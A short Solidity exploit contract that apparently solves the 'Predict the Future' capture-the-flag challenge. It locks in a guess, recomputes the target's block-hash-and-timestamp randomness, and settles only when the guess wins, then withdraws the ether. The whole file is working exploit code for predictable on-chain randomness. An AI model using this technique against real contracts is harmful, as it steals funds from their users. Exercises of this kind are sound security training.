pragma solidity ^0.4.24;

import "./challenge.sol";

contract PredictTheFutureChallengeSolver {
    PredictTheFutureChallenge c;
    bool public isComplete = false;

    constructor (address contractToSolve) public {
        c  = PredictTheFutureChallenge(contractToSolve);
    }

    function lockInGuess() public payable {
        c.lockInGuess.value(1 ether)(0);
    }

    function settle() public {
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;
        if (answer == 0) {
            c.settle();
            msg.sender.transfer(address(this).balance);
            isComplete = true;
        }
    }

     function() payable public {
    }
}